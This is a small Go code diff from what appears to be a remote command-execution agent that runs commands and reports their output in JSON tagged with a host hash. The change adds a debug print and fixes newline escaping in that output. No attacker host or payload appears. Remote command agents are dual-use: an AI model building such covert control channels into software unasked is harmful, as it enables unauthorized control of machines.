@@ -116,6 +116,7 @@ func getInput(input chan string) {
         case msg := <-cmdOutput:
             output := fmt.Sprintf(`{"OpCode": 1, "ID": %s, "Output": "%s"}`, hostHash, msg)
             output = strings.ReplaceAll(output, `\`, `\\`)
+            fmt.Println(output)
             input <- output
         }
 
@@ -143,7 +144,7 @@ func executeCmd(cmd string) {
     }
 
     out = []byte(strings.TrimSpace(string(out)))
-    out = []byte(strings.ReplaceAll(string(out), "\r\n", "\n"))
+    out = []byte(strings.ReplaceAll(string(out), "\r\n", `\n`))
     cmdOutput <- out
 }
 
